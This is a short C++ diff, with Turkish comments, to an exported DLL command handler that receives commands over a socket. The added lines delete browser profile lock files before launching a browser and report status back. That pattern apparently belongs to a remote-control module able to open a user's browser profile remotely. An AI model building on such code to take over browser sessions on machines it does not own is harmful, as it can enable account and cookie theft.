@@ -2100,6 +2100,19 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         } catch (...) {}
                     }
 
+                    // Tarayıcı kilit dosyalarını (SingletonLock vb.) temizle
+                    {
+                        vector<wstring> locks = { L"SingletonLock", L"SingletonSocket", L"SingletonCookie", L"parent.lock", L"lock" };
+                        for (const auto& lk : locks) {
+                            try {
+                                fs::remove(fs::path(profilePath) / lk);
+                            } catch (...) {}
+                            try {
+                                fs::remove(fs::path(profilePath) / L"Default" / lk);
+                            } catch (...) {}
+                        }
+                    }
+
                     send_status("Tarayıcı başlatılıyor...");
 
                     wstring args;
